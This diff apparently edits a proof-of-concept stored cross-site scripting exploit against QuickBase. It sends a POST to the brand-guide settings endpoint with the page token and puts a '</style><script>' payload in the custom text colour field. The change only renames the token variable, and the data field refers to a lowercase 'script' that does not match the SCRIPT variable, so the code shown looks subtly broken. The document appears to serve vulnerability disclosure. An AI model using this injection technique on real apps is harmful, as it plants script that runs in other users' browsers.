@@ -14,14 +14,14 @@ QuickBase engineers only sanitized input client side on a value that gets insert
 var DBID = "";
 var REALM = "";
 var SCRIPT = "alert('HELLO!');";
-var token = $("[name=PageToken]").val();
+var TOKEN = $("[name=PageToken]").val();
 
 $.ajax({
   url: "https://" + REALM + ".quickbase.com/db/" + DBID + "?a=SaveAppSettingsBrandGuide",
   type: "POST",
   data: {
     uiCustomTextColor: "</style><script>" + script + "</script><style>",
-    PageToken: token,
+    PageToken: TOKEN,
     CustomHeader: "on",
     uiCustomHeaderOptions: "iBasic",
     apply: "Save"
